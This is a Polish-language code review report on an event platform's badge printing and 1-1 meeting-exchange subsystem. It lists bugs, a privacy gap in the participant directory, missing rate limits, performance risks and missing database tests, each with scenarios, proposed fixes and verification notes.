Dwa miejsca wolaja admin_event_badge_print_record z powodem, ktorego CHECK event_badge_prints_reason_values nie zna: `reason: "desk"` (OnsiteDeskPanel.tsx:102) i `reason: "initial"` (OnsiteBadgePrintPanel.tsx:150). Slownik to first_issue | reprint_lost | reprint_damaged | data_correction | bulk_preprint (src/lib/events/onsiteEnums.ts:68-75). _event_badge_print_write nie odrzuca tego, tylko po cichu podmienia: `IF v_reason NOT IN (...) THEN v_reason := CASE WHEN v_prints > 0 THEN 'reprint_lost' ELSE 'first_issue' END` (supabase/migrations/20260823180000_event_onsite.sql:4028-4034). Typ pola w kliencie to goly `string` (src/lib/events/onsiteApi.ts:628), wiec TypeScript tego nie lapie. Osobno: printBadge w OnsiteDeskPanel (linie 95-108) wola WYLACZNIE zapis do rejestru - nie otwiera okna druku, nie buduje dokumentu, nie wydaje kodu QR - a po sukcesie pokazuje toast 'badgePrinted'.

**Scenariusz.** Recepcjonistka klika 'Drukuj identyfikator' przy nazwisku goscia, dostaje komunikat o wydrukowaniu identyfikatora i nic nie wychodzi z drukarki. W rejestrze wydrukow pojawia sie wiersz z powodem 'first_issue' (albo 'reprint_lost' przy drugim klikniecu), wiec panel 'Wydruki' pokazuje wydruk, ktorego nikt nie wykonal, a przedruk masowy z OnsiteBadgePrintPanel jest liczony jako 'zgubiony identyfikator' zamiast […]

**Naprawa.** Zawezic typ BadgePrintInput.reason do BadgePrintReason i przekazywac 'bulk_preprint' z generatora partii oraz 'first_issue'/'reprint_lost' z recepcji. W OnsiteDeskPanel podpiac te sama sciezke druku co w OnsiteBadgePrintPanel (wydanie kodu + buildBadgePrintDocument + window.print) albo zmienic etykiete przycisku i toast na 'odnotuj wydanie identyfikatora'.

**Weryfikacja.** Pierwsza polowa potwierdzona: OnsiteDeskPanel.tsx:102 wysyla `reason: "desk"`, OnsiteBadgePrintPanel.tsx:150 wysyla `reason: "initial"`, a slownik to first_issue|reprint_lost|reprint_damaged|data_correction|bulk_preprint (src/lib/events/onsiteEnums.ts:67-75). _event_badge_print_write nie odrzuca, tylko po cichu podmienia na 'reprint_lost'/'first_issue' (20260823180000_event_onsite.sql:4030-4034), a typ pola w […]

---

## Spotkania 1-1

> Podsystem to pełnoprawny, drugi silnik spotkań zbudowany od zera obok starego `meeting_slots`/`meeting_bookings`: 6 tabel (`event_meeting_tables`, `event_meeting_settings`, `event_meeting_rule_groups`, `event_meeting_availability`, `event_meetings`, `event_meeting_attendees`) i ~25 funkcji w `supabase/migrations/20260823190000_event_meetings.sql` (4736 linii), plus katalog uczestników z `20260825200000` nadpisany przez `20260828131628`. Warstwa bazy jest wyjątkowo mocna: podwójna rezerwacja jest domknięta trzema niezależnymi mechanizmami serwerowymi (EXCLUDE `event_meetings_table_no_overlap` na miejscu przy stoliku, EXCLUDE `event_meeting_attendees_no_overlap` na terminie osoby przez tabelę-projekcję utrzymywaną triggerem `tg_event_meetings_sync_attendees`, oraz częściowy indeks unikalny `event_meetings_pair_slot_uniq` na parze), a przydział miejsca idzie pod `FOR UPDATE` w `_event_meeting_take_seat`. Reguły „kto z kim” (`_event_meeting_can_invite`) są egzekwowane serwerowo w każdej ścieżce zapisu i odczytu, nie tylko filtrują UI. Front jest kompletny po stronie uczestnika […]

### [KRYTYCZNY] Dialog „Umów spotkanie” jest martwy: filtr statusu zapisu pyta o wartość, której baza nie zna

`src/lib/events/meetingParticipants.ts:26` · blad · weryfikacja: POTWIERDZONE

`const ARRANGEABLE_STATUS = "confirmed";` (linia 26) trafia do `p_status` w `searchMeetingParticipants` (linia 74). `admin_event_registrations_list` filtruje dosłownie: `AND (p_status IS NULL OR p_status = 'all' OR r.status = p_status)` (supabase/migrations/20260824090214_f14a8b5f-3eb3-4dc3-93e6-412c31946cf2.sql:767), a CHECK na kolumnie dopuszcza wyłącznie `draft, pending, approved, rejected, waitlist, cancelled, attended, no_show` (20260823150000_event_people_registration.sql:692). Wartości `confirmed` nie ma i nigdy nie było — cała reszta modułu spotkań mówi `status IN ('approved','attended')` (np. _event_meeting_can_invite, migracja spotkań :1330). Zapytanie nie zgłasza błędu, po prostu zwraca zero wierszy, więc `PersonPicker` renderuje „personsEmpty” (ArrangeMeetingDialog.tsx:96), `canSubmit` (linia 143) nigdy nie jest prawdziwe, a przycisk „Umów” pozostaje na stałe wyszarzony. Test jednostkowy pokrywa wyłącznie `participantLabel`/`toParticipantOption` i nie dotyka wartości […]

**Scenariusz.** Redaktor otwiera /admin/events/<id>/meetings/list, klika „Umów spotkanie”, wpisuje nazwisko istniejącego, zatwierdzonego uczestnika. Lista pozostaje pusta („Brak uczestników”), przycisk zapisu jest nieaktywny. Funkcja admin_event_meeting_arrange — jedyna ścieżka realizacji obietnic z pakietów sponsorskich („dziesięć umówionych spotkań z decydentami”) — nie jest osiągalna z żadnego ekranu.

**Naprawa.** Zamienić `ARRANGEABLE_STATUS` na wartość rozpoznawaną przez bazę. Ponieważ giełda dopuszcza DWA statusy ('approved' i 'attended'), pojedynczy `p_status` ich nie wyrazi — najprościej wysłać `p_status: 'all'` i odfiltrować po stronie klienta (`row.status === 'approved' || row.status === 'attended'`), albo dołożyć w `admin_event_registrations_list` obsługę pseudostatusu `participating` (`r.status IN […]

**Weryfikacja.** src/lib/events/meetingParticipants.ts:26 `const ARRANGEABLE_STATUS = "confirmed"` i :74 `p_status: ARRANGEABLE_STATUS`. Najnowsza definicja RPC to supabase/migrations/20260824090214_f14a8b5f-3eb3-4dc3-93e6-412c31946cf2.sql:632-641 (sygnatura z p_q/p_status) i :767 `AND (p_status IS NULL OR p_status = 'all' OR r.status = p_status)` - filtr doslowny, bez mapowania. CHECK w […]

### [wysoki] Brak jakiegokolwiek UI dla okien dostępności wpisywanych przez organizatora — uczestnika bez konta nie da się umówić

`src/lib/events/meetingsApi.ts:491` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`saveAdminAvailability` (linia 491) i `deleteAdminAvailability` (linia 515) opakowują `admin_event_meeting_availability_set` / `_delete`. Grep po tych nazwach w całym `src/` zwraca wyłącznie sam `meetingsApi.ts` i `src/lib/events/__tests__/meetingsApi.test.ts:258` — nie ma dla nich hooka w `useMeetings.ts` ani żadnego komponentu. Migracja nazywa tę ścieżkę wprost: „Okno dostepnosci wpisane przez organizatora — jedyna sciezka dla uczestnika BEZ KONTA” (20260823190000_event_meetings.sql:2666, uzasadnienie :2720-2731). Bez niej łańcuch się rozpina: `tg_event_meetings_validate` wymaga OTWARTEGO okna po obu stronach dla stanów `invited`/`accepted` (:1811-1830), a `_event_meeting_free_slots` przecina okna obu stron (:1600-1603) — więc również `admin_event_meeting_arrange` nie umówi takiej osoby.

**Scenariusz.** Kongres importuje 400 uczestników z listy (event_people.user_id IS NULL — przypadek, dla którego cała kartoteka została zaprojektowana). Żaden z nich nie ma jak zadeklarować dostępności (nie ma konta, więc nie wejdzie na /meetings/<slug>), a organizator nie ma gdzie tego wpisać. Każda próba umówienia kończy się `invitee_unavailable`, a statystyki pokazują 400 osób „bez ani jednego spotkania” bez wskazania przyczyny.

**Naprawa.** Dołożyć w studiu wydarzenia sekcję albo panel boczny przy liście zapisów: wybór zgłoszenia + lista jego okien + dialog identyczny w kształcie z `AvailabilityWindowDialog`, spięty hookami nad `saveAdminAvailability`/`deleteAdminAvailability` (wzorzec `useSaveMyAvailability` z useMyMeetings.ts:122). Naturalne miejsce: nowa podsekcja `meetings/availability` w `eventStudioNav.ts:67-70` albo akcja w wierszu […]

**Weryfikacja.** src/lib/events/meetingsApi.ts:491 i :515 opakowuja admin_event_meeting_availability_set/_delete; grep po obu nazwach i po saveAdminAvailability/deleteAdminAvailability w calym src/ (z wylaczeniem integrations/supabase/types.ts) daje wylacznie meetingsApi.ts i src/lib/events/**tests**/meetingsApi.test.ts:97,159,258,266 - zadnego hooka w useMeetings.ts, zadnego komponentu. Sprawdzilem tez nawigacje studia: […]

### [wysoki] Katalog giełdy pomija zgodę profiles.discoverable i tryb Chatham House, które respektuje bliźniacza lista uczestników — i wystawia więcej danych niż ona

`supabase/migrations/20260828131628_c9408e42-c11c-4ab4-bb65-fdc792d0d8e2.sql:96` · bezpieczenstwo · weryfikacja: POTWIERDZONE

`event_meeting_directory` filtruje kandydatów wyłącznie po `r.status IN ('approved','attended') AND r.directory_opt_out = false AND _event_meeting_can_invite(...) IS NULL` (linie 94-96). Nie czyta `profiles.discoverable` ani `events.chatham_house`. Równoległa lista tej samej populacji — `event_attendees` — wymaga OBU zgód i sama to nazywa: `AND r.directory_opt_out = false AND pr.discoverable = true` z komentarzem „DWIE ZGODY, OBIE WYMAGANE” (20260827065944_fbf90e88-713b-4475-94f4-97a841a84b8d.sql:283-284), a przy `chatham_house = true` w ogóle nie wypuszcza nazwisk (tamże :219 i komentarz w :402). Ta sama migracja z 20260828131628 rozszerzyła katalog giełdy z danych „identyfikatorowych” do `p.user_id, p.photo_url, p.industry, p.specialization, co.logo_url` (linie 81-85, 143-147) — wbrew własnemu nagłówkowi z 20260825200000_event_meeting_directory.sql:42-45 („Imię, nazwisko, stanowisko, firma i grupa — czyli dokładnie to, co drukuje się na identyfikatorze”). Front konsumuje `user_id` […]

**Scenariusz.** Uczestnik ustawia w profilu `discoverable = false` (i/lub organizator włącza `events.chatham_house`). Znika z zakładki „Uczestnicy” (`event_attendees`), ale w zakładce „Katalog” giełdy spotkań (ParticipantDirectoryPanel) wychodzi dalej: imię, nazwisko, stanowisko, firma, zdjęcie, branża, specjalizacja oraz identyfikator konta, na którym każdy inny uczestnik dostaje przycisk „Napisz wiadomość”. Człowiek widzi więc […]

**Naprawa.** Dopisać w `candidates` te same dwa warunki, co w `event_attendees`: `JOIN public.profiles pr ON pr.id = p.user_id AND pr.tenant_id = r.tenant_id` z `AND pr.discoverable = true` (albo LEFT JOIN + `COALESCE(pr.discoverable, ...)` jeśli osoba bez konta ma zostać na liście, bo giełda musi umieć umówić kogoś bez konta) oraz obsługę `events.chatham_house` (ukrycie nazwisk/zdjęć). Dodatkowo rozstrzygnąć świadomie, czy […]

**Weryfikacja.** grep 'chatham|discoverable' w supabase/migrations/20260828131628_c9408e42-c11c-4ab4-bb65-fdc792d0d8e2.sql oraz w 20260825200000_event_meeting_directory.sql daje ZERO trafien - katalog nie czyta ani jednego z tych pol. Predykat kandydatow to 20260828131628:92-96 (`r.status IN ('approved','attended') AND r.directory_opt_out = false AND _event_meeting_can_invite(...) IS NULL`), a wypuszczane pola to :81-85 i :143-147 […]

### [średni] Dwa niezależne silniki spotkań 1-1 nad tym samym wydarzeniem, bez wzajemnej kontroli kolizji; stary ma pojedynczy klucz obcy do events

`supabase/migrations/20260728090000_meeting_slots_networking.sql:28` · ryzyko · weryfikacja: PRAWDOPODOBNE

`meeting_slots.event_id uuid REFERENCES public.events(id) ON DELETE CASCADE` (linia 28) — klucz POJEDYNCZY, więc wiersz najemcy A może wskazać wydarzenie najemcy B; nowy moduł opisuje to jako powód nr 5 własnego istnienia (20260823190000_event_meetings.sql:24-27), ale samego klucza nie naprawia. Specyfikacja żądała rozszerzenia, nie zastąpienia: „§4.14 SPOTKANIA 1-1 - rozszerzenie, nie zastapienie” z konkretnym `ALTER TABLE public.meeting_slots ALTER COLUMN host_user_id DROP NOT NULL` (docs/PROJEKT_MODUL_EVENT_BUILDER_2026-08-23.md:645-655). Powstał zamiast tego drugi komplet tabel. Oba silniki żyją równolegle nad tym samym `event_id`: widget `meeting-booking` czyta `get_public_meeting_slots(p_event_id)` (migracja :112, src/lib/builder/meetingsQuery.ts:93), giełda czyta `event_meetings`. Żadna funkcja nie sprawdza drugiej strony: `_event_meeting_free_slots` nie zna `meeting_bookings`, a `book_meeting_slot` nie zna `event_meeting_attendees`. Dodatkowo grant jest niespójny: […]

**Scenariusz.** Na stronie wydarzenia stoi widget `meeting-booking` (partner publikuje własne okna) i równolegle działa giełda. Uczestnik rezerwuje slot partnera na 11:00 przez `book_meeting_slot`, a piętnaście minut później przyjmuje zaproszenie giełdy na 11:00 przez `event_meeting_respond`. Obie operacje przechodzą — EXCLUDE na `event_meeting_attendees` nie widzi `meeting_bookings`. Uczestnik ma dwa potwierdzone spotkania o tej […]

**Naprawa.** Rozstrzygnąć granicę i zapisać ją w kodzie, a nie tylko w komentarzu: albo (a) zablokować `event_id` na `meeting_slots` dla wydarzeń z włączoną giełdą (`event_meeting_settings.is_enabled`), żeby jeden slot wydarzenia miał jednego właściciela, albo (b) dołożyć do `_event_meeting_free_slots` i `_event_meeting_take_seat` warunek `NOT EXISTS` po potwierdzonych `meeting_bookings` tej osoby, a symetrycznie do […]

**Weryfikacja.** Czesc glowna potwierdzona: meeting_slots/meeting_bookings zyja rownolegle nad tym samym event_id (widget istnieje - src/lib/builder/registry.tsx typ 'meeting-booking', src/lib/builder/meetingsQuery.ts:92-97 wola get_public_meeting_slots(p_event_id), a src/lib/events/eventPageTemplates.ts wstawia ten widget do szablonu strony wydarzenia), i zadna z funkcji nie widzi drugiej strony - EXCLUDE […]

### [średni] Filtry listy spotkań zaimplementowane w RPC i w typie zapytania nie mają odpowiednika w interfejsie

`src/components/admin/events/organisms/MeetingsListPanel.tsx:88` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`admin_event_meetings_list` przyjmuje i realizuje filtry `group_id`, `sponsor_id`, `day` (liczony w strefie giełdy), `from`, `to` (20260823190000_event_meetings.sql:2786-2793, z osobnym ustaleniem strefy w :2803-2812). `AdminMeetingsQuery` deklaruje je wszystkie (src/lib/events/meetingsApi.ts:380-387), a `fetchAdminMeetings` wysyła (`:396-403`). Panel buduje zapytanie wyłącznie z `status`, `tableId`, `search`, `limit`, `offset` (linie 88-98) — pozostałe pięć pól nigdy nie jest ustawiane, więc lecą jako `null`. Cała kolumna „dzień giełdy”, dla której RPC świadomie liczy datę w strefie wydarzenia, jest nieosiągalna.

**Scenariusz.** W dniu drugim trzydniowego kongresu organizator chce zobaczyć wyłącznie spotkania dzisiejsze albo wyłącznie spotkania grupy „Partnerzy”. Nie ma czym — przewija paginowaną listę wszystkich spotkań wydarzenia po 25 wierszy, filtrując wzrokiem po dacie w wierszu.

**Naprawa.** Dołożyć do paska filtrów (linie 187-221) trzy kontrolki: wybór dnia z `meeting_days` konfiguracji giełdy (`useMeetingSettings(eventId).data.meeting_days`), select grupy (`available_groups` z tej samej odpowiedzi) i select sponsora, i wpiąć je do `useMemo` budującego `query`. Kod RPC nie wymaga zmian.

**Weryfikacja.** RPC realizuje piec dodatkowych filtrow: supabase/migrations/20260823190000_event_meetings.sql:2788-2795 (v_group_id, v_sponsor_id, v_day, v_from, v_to) plus swiadome ustalenie strefy dla filtra 'day' w :2803-2812. Warstwa API deklaruje je i wysyla: src/lib/events/meetingsApi.ts:377-390 (AdminMeetingsQuery z groupId/sponsorId/day/from/to) i :392-403 (fetchAdminMeetings przekazuje group_id, sponsor_id, day, from, to). […]

### [średni] Przełożenie spotkania omija okno otwarcia giełdy i bramkę częstotliwości, które obowiązują przy zaproszeniu

`supabase/migrations/20260823190000_event_meetings.sql:4447` · blad · weryfikacja: POTWIERDZONE

`event_meeting_invite` przechodzi siedem bramek, w tym `exchange_closed` na `invites_open_at`/`invites_close_at` (:3997-4000) i atomowy `rate_limit_hit('event_meeting_invite', ..., 30, 10)` (:4005-4008). `event_meeting_reschedule` (:4447) tworzy DOKŁADNIE TAKI SAM wiersz `status = 'invited'` (:4529-4537) i nie robi ani jednego z tych dwóch sprawdzeń — grep po `invites_close_at` i `rate_limit` w ciele funkcji (linie 4447-4585) nie daje trafień. Sprawdza tylko `meetings_disabled` i `_event_meeting_can_invite`. Pomija też limit dzienny, który `event_meeting_invite` liczy (:4029-4046) — komentarz nad funkcją uzasadnia wyłącznie pominięcie limitu ZAPROSZEŃ (bilans się nie zmienia), nie pozostałych dwóch.

**Scenariusz.** Organizator zamyka giełdę na nowe zaproszenia (`invites_close_at` w przeszłości), bo grafik jest już zamknięty i drukowane są plany stolików. Uczestnik z jednym aktywnym zaproszeniem woła `event_meeting_reschedule` w pętli: każde wywołanie zamyka stary wiersz i tworzy nowe, świeże zaproszenie na dowolny slot siatki — bez limitu częstotliwości, więc generuje dowolną liczbę powiadomień do drugiej osoby i przestawia […]

**Naprawa.** W `event_meeting_reschedule` po sprawdzeniu `meetings_disabled` dołożyć te same dwa warunki, co w `event_meeting_invite`: sprawdzenie `invites_open_at`/`invites_close_at` (klucz `exchange_closed`) oraz `rate_limit_hit` (osobny bucket, np. 'event_meeting_reschedule'). Rozważyć też ponowne policzenie limitu dziennego dla nowego dnia — przełożenie na inny dzień zmienia bilans dzienny, więc uzasadnienie „bilans się nie […]

**Weryfikacja.** Przeczytalem cale cialo event_meeting_reschedule, supabase/migrations/20260823190000_event_meetings.sql:4446-4585: sprawdza forbidden (:4468), invalid_payload, not_found, not_a_party (:4494), meeting_not_active (:4498), same_slot (:4502), meetings_disabled (:4510-4512) i _event_meeting_can_invite (:4514-4517) - i na tym koniec, po czym :4529-4541 wstawia nowy wiersz `status='invited'`. Ani jednego wystapienia […]

### [średni] Przycisk „Zaproś” w katalogu nie respektuje okna otwarcia giełdy (open_now) — odmowa dopiero po wyborze terminu

`src/components/events/meetings/ParticipantDirectoryPanel.tsx:297` · niespojnosc · weryfikacja: POTWIERDZONE

`exchangeBlock` liczy blokadę `closed` z `open_now` (src/lib/events/meetingExchange.ts:226), a `MeetingExchangeBoard` pokazuje ją jako baner nad zakładkami (MeetingExchangeBoard.tsx:110-114). Ale zakładka „Katalog” jest renderowana niezależnie od blokady (MeetingExchangeBoard.tsx:166-172) i nie dostaje `openNow` w żadnym propsie — przycisk „Zaproś” wyświetla się dla każdego wiersza bez spotkania (`entry.meetingStatus === null`, linia 297) i otwiera `MeetingInviteDialog`. Serwer odmawia dopiero w `event_meeting_invite`: `IF (invites_open_at > now()) OR (invites_close_at <= now()) THEN RAISE 'exchange_closed'` (20260823190000_event_meetings.sql:3997-4000). Ten sam wzorzec jest w komponencie obok zrobiony poprawnie — `canEditAvailability` bramkuje edycję okien (MeetingExchangeBoard.tsx:69).

**Scenariusz.** Organizator ustawia `invites_open_at` na dzień przed kongresem. Uczestnik wchodzi tydzień wcześniej, widzi baner „giełda zamknięta na nowe zaproszenia”, ale w zakładce Katalog ma przy każdej osobie aktywny przycisk „Zaproś”. Wybiera osobę, czeka na listę wolnych terminów (osobne zapytanie), wybiera slot, wpisuje temat, klika „Wyślij” — i dopiero wtedy dostaje toast „Giełda spotkań jest w tej chwili zamknięta na nowe […]

**Naprawa.** Przekazać `openNow` (albo gotowy `blocked`) z `MeetingExchangeBoard` do `ParticipantDirectoryPanel` i wyłączyć/ukryć przycisk zaproszenia, gdy `openNow === false`, z podpisem mówiącym od kiedy giełda przyjmuje zaproszenia (`invitesOpenAt` już jest w sparsowanym stanie, meetingExchange.ts:193).

**Weryfikacja.** src/lib/events/meetingExchange.ts:221-228 - exchangeBlock zwraca 'closed' gdy !openNow; src/components/events/meetings/MeetingExchangeBoard.tsx:109-114 rysuje to jako baner, a :166-172 renderuje <ParticipantDirectoryPanel slug timezone onOpenMeetings> BEZ propsa openNow/block (dla porownania :69 `canEditAvailability` i :180 przekazanie `canEdit` do MeetingAvailabilityPanel - ten sam wzorzec zrobiony poprawnie obok). […]

### [średni] Przyciski frekwencji i odwołania w liście panelu są aktywne dla każdego wiersza niezależnie od stanu spotkania

`src/components/admin/events/organisms/MeetingsListPanel.tsx:269` · niespojnosc · weryfikacja: POTWIERDZONE

Trzy przyciski — „odbyło się”, „nieobecność”, „odwołaj” — są renderowane bezwarunkowo dla KAŻDEGO wiersza (linie 269, 273, 277), mimo że `AdminMeetingRow` niesie `status` i `is_expired`. Baza je odrzuca rozłącznie: `admin_event_meeting_set_status` wymaga `status IN ('accepted','held','no_show')` dla frekwencji (`attendance_needs_accepted`, migracja :3164-3167) i `status IN ('invited','accepted')` dla odwołania (`meeting_not_active`, :3175-3177). Ta sama logika jest po stronie uczestnika zrobiona poprawnie i wprost przetestowana — `canRespond` / `canCancel` / `canReschedule` w src/lib/events/myMeetingRows.ts:225-237, z komentarzem tłumaczącym, dlaczego warunek nie może siedzieć w JSX (myMeetingRows.ts:206-210).

**Scenariusz.** Organizator otwiera zakładkę „Odrzucone” i klika „odbyło się” przy odrzuconym zaproszeniu, żeby poprawić pomyłkę. Dostaje czerwony toast „Frekwencję można odnotować wyłącznie na spotkaniu potwierdzonym przez obie strony”. Na zakładce „Wszystkie” każdy z ~25 wierszy ma trzy przyciski, z których średnio dwa zawsze skończą się błędem.

**Naprawa.** Powtórzyć wzorzec z `myMeetingRows.ts`: dodać do modułu predykaty `canMarkAttendance(row)` (`row.status === 'accepted' || row.status === 'held' || row.status === 'no_show'`) i `canCancelAsOrganiser(row)` (`row.status === 'invited' || row.status === 'accepted'`), objąć je testem i użyć do warunkowego renderu w liniach 268-288.

**Weryfikacja.** src/components/admin/events/organisms/MeetingsListPanel.tsx:267-289 - trzy <Button> ('markHeldAction', 'markNoShowAction', 'cancelAction') stoja bezwarunkowo w kazdym <li> mapy rows, mimo ze wiersz niesie row.status i row.is_expired (uzywane tylko w statusKey, :66-69). Baza odrzuca rozlacznie: admin_event_meeting_set_status w supabase/migrations/20260823190000_event_meetings.sql:3163-3167 […]

### [średni] Wydajność katalogu: reguła zaproszenia liczona funkcją plpgsql dla każdego zapisu wydarzenia przy każdym zapytaniu

`supabase/migrations/20260828131628_c9408e42-c11c-4ab4-bb65-fdc792d0d8e2.sql:96` · ryzyko · weryfikacja: POTWIERDZONE

Predykat CTE `candidates` woła `public._event_meeting_can_invite(v_tenant, v_event.id, v_me, r.id)` (linia 96) dla KAŻDEGO uczestniczącego zapisu wydarzenia, przed limitem i offsetem — bo `totals` musi policzyć całość (linie 123-124). Ta funkcja to plpgsql wykonujący do sześciu osobnych zapytań, w tym dwa wywołania `_event_meeting_groups` (20260823190000_event_meetings.sql:1310-1424), a `_event_meeting_groups` sama jest zapytaniem z UNION po trzech tabelach (:1159-1195). Dodatkowo dla wierszy strony liczone są `_event_meeting_groups` po raz kolejny (linie 157-158) i podzapytania `has_availability` / `meeting_status` (161-178). Front odpytuje przy każdej zmianie frazy z debouncem 300 ms (src/components/events/meetings/ParticipantDirectoryPanel.tsx:72-79) i przy każdej mutacji, bo `useSetDirectoryVisibility`/`useInviteToMeeting` unieważniają całą gałąź (src/lib/events/useMyMeetings.ts:114-119).

**Scenariusz.** Kongres na 3000 zatwierdzonych zapisów, w dniu wydarzenia kilkuset uczestników jednocześnie przegląda katalog. Każde naciśnięcie klawisza w wyszukiwarce (po debouncie) uruchamia ~3000 wywołań funkcji plpgsql, każde z kilkoma zapytaniami. Baza dławi się na jednym ekranie, a jest to ekran, przez który przechodzi każde nowe zaproszenie.

**Naprawa.** Rozłożyć predykat na warunki zbiorowe: policzyć raz grupy wołającego i raz mapę `registration_id -> grupy` (jednym zapytaniem z `event_registrations` + `event_group_members`), a regułę widoczności wyrazić operacjami na zbiorach zamiast wywołaniem per wiersz. `_event_meeting_can_invite` zostawić jako pojedynczą bramkę w `event_meeting_invite`/`event_meeting_free_slots`, gdzie jest wołana raz. Alternatywnie: zawęzić […]

**Weryfikacja.** supabase/migrations/20260828131628_c9408e42-c11c-4ab4-bb65-fdc792d0d8e2.sql:96 - `AND public._event_meeting_can_invite(v_tenant, v_event.id, v_me, r.id) IS NULL` w predykacie CTE `candidates`, a `totals` (:123-124) liczy count(*) po calym CTE, wiec limit/offset (:127-131) nie zdejmuje kosztu. Funkcja jest plpgsql STABLE z maksymalnie szescioma zapytaniami: 20260823190000_event_meetings.sql:1331-1333 (ustawienia), […]

### [średni] Zero testów pgtap dla podsystemu, w którym cała poprawność stoi na ograniczeniach bazy

`supabase/migrations/20260823190000_event_meetings.sql:959` · brak-testow · weryfikacja: POTWIERDZONE

Podsystem opiera całą gwarancję braku podwójnej rezerwacji na trzech konstrukcjach bazodanowych tworzonych DYNAMICZNIE, w blokach `DO $$` szukających klasy operatorów w katalogu: `event_meetings_table_no_overlap` (:959-1000), `event_meeting_attendees_no_overlap` (:1111-1143), `event_meeting_availability_no_overlap` (:657-689). Każdy z nich rozpoczyna się od `IF EXISTS (...) THEN RETURN` — czyli po cichu pomija utworzenie ograniczenia, jeśli takie już jest, i podnosi `btree_gist_missing` tylko gdy klasy operatorów nie ma. Do tego dochodzi reguła widoczności `_event_meeting_can_invite` z czterema gałęziami i dziewięcioma kluczami błędu oraz komplet polityk RLS na sześciu tabelach. `grep -rl "event_meeting" supabase/tests/` zwraca ZERO plików, podczas gdy katalog zawiera ~80 testów pgtap dla innych modułów (m.in. `event_admin_only_contract_test.sql`, `chat_privacy_isolation_test.sql`).

**Scenariusz.** Ktoś w przyszłej migracji dodaje do `event_meetings` stan pośredni albo zmienia warunek częściowy EXCLUDE (np. wyłącza `no_show` ze zbioru zajętych terminów). Nic tego nie wykrywa: TypeScript nie widzi SQL-a, a testy w `src/lib/events/__tests__/` operują na zamockowanym kliencie Supabase. Regresja wychodzi dopiero na kongresie, jako dwoje ludzi przy jednym stoliku o 11:00.

**Naprawa.** Dopisać `supabase/tests/event_meetings_test.sql` z asercjami: (1) drugie `accepted` na tym samym `(table_id, table_seat)` i nachodzącym przedziale jest odrzucane; (2) drugie `accepted` dla tej samej `registration_id` w nachodzącym czasie jest odrzucane; (3) `invited` NIE blokuje równoległego `invited` tej samej osoby; (4) `_event_meeting_can_invite` zwraca właściwe klucze dla każdej z czterech reguł widoczności; (5) […]

**Weryfikacja.** `grep -rl "event_meeting" supabase/tests/` zwraca ZERO plikow przy 100 pozycjach w katalogu (trafienia na samo 'meeting' dotycza wylacznie starego silnika: network_event_notifications_test.sql, missing_event_notifications_test.sql, notification_preferences_gating_test.sql, README.md). Sprawdzilem tez druga sciezke kontroli, ktora ta migracja sama przywoluje - scripts/events-harness: grep 'meeting' w harness.sql, […]

### [niski] Nowy stolik zawsze dostaje sort_order = 0, więc gałąź „dopisz na koniec listy” w RPC nigdy się nie wykonuje

`src/components/admin/events/molecules/MeetingTableDialog.tsx:278` · niespojnosc · weryfikacja: POTWIERDZONE

`NEW_DRAFT` ustawia `sortOrder: "0"` (linia 278), a `submit` wysyła `sortOrder: toNumber(draft.sortOrder, 0)` (linia 341), więc payload zawsze niesie `sort_order: 0`. W `admin_event_meeting_table_save` obliczenie `v_sort := COALESCE((NULLIF(p_payload->>'sort_order',''))::integer, v_row.sort_order)` daje 0 (nie NULL), przez co blok `IF v_sort IS NULL THEN SELECT COALESCE(max(t.sort_order),0)+10 ...` (20260823190000_event_meetings.sql:2079-2084) jest martwy — jego komentarz mówi „Nowy stolik lezy na koncu listy, a nie w losowym miejscu srodka”. Kolejność `sort_order` nie jest kosmetyką: `_event_meeting_take_seat` przydziela miejsce `ORDER BY t.sort_order, t.label, seat.n` (:1710), więc decyduje, przy którym stoliku fizycznie siada uczestnik.

**Scenariusz.** Redaktor dodaje pięć stolików po kolei, nie dotykając pola „kolejność”. Wszystkie mają sort_order = 0, więc porządek rozstrzyga alfabetyczne `label` — „Stolik 10” trafia przed „Stolik 2”, a przydział miejsc idzie w tej kolejności. Stolik dodany jako ostatni bywa zapełniany jako pierwszy.

**Naprawa.** W `MeetingTableDialog` dla nowego wiersza nie wysyłać `sort_order` wcale (pominąć klucz — `payload()` w meetingsApi.ts:48-56 już usuwa `undefined`), zostawiając decyzję bazie; albo zainicjalizować `NEW_DRAFT.sortOrder` pustym napisem i mapować puste na `undefined`.

**Weryfikacja.** Numery linii sa zawyzone (plik jest krotszy), ale tresc sie zgadza: src/components/admin/events/molecules/MeetingTableDialog.tsx:43-48 NEW_DRAFT z `sortOrder: "0"` i :111 `sortOrder: toNumber(draft.sortOrder, 0)` w submit; src/lib/events/meetingsApi.ts:82-95 zawsze wklada `sort_order: input.sortOrder` do payloadu, a payload() (:48-56) pomija tylko `undefined`, wiec 0 leci zawsze. W RPC […]

### [niski] Temat spotkania krótszy niż dwa znaki wysadza CHECK-a i degraduje do komunikatu „nieznany błąd”

`src/components/events/meetings/MeetingInviteDialog.tsx:126` · blad · weryfikacja: POTWIERDZONE

Pole tematu ma wyłącznie `maxLength={200}` (linia 129) i przechodzi walidację „niepusty” (linia 153: `topic.trim() === "" ? null : topic.trim()`). Baza wymaga przedziału: `CONSTRAINT event_meetings_topic_len CHECK (topic IS NULL OR char_length(btrim(topic)) BETWEEN 2 AND 200)` (20260823190000_event_meetings.sql:782). Blok `EXCEPTION` w `event_meeting_invite` łapie wyłącznie `unique_violation` i `exclusion_violation` (:4091-4109) — `check_violation` przelatuje jako surowy komunikat Postgresa. `meetingErrorKey` wycina człon przed pierwszym dwukropkiem i sprawdza go regexem `^[a-z][a-z0-9_]*$` (src/lib/events/meetingsErrors.ts:403-405); surowe „new row for relation ... violates check constraint ...” nie pasuje, więc zwraca `unknown`. Ten sam problem dotyczy `topic` w ArrangeMeetingDialog.tsx:242 (brak jakiejkolwiek walidacji długości) i nieistniejącego `sponsor_id` (foreign_key_violation też nie jest łapane).

**Scenariusz.** Uczestnik wpisuje w temat pojedynczą literę („M” jako skrót projektu), wybiera termin i wysyła. Dostaje toast „Nie udało się wykonać tej operacji. Spróbuj ponownie.” Ponawia — ten sam komunikat. Nie ma żadnej wskazówki, że winne jest pole tematu.

**Naprawa.** Dwa poziomy: (1) w UI wymagać `topic.trim().length === 0 || topic.trim().length >= 2` przed wysłaniem i podpisać pole; (2) w `event_meeting_invite`, `event_meeting_reschedule` i `admin_event_meeting_arrange` dołożyć do bloku EXCEPTION `WHEN check_violation THEN RAISE EXCEPTION 'invalid_topic: ...'` (wzorzec z `event_meeting_availability_set`, migracja :3752-3754) i dopisać klucz `invalid_topic` do MEETING_ERROR_KEYS […]

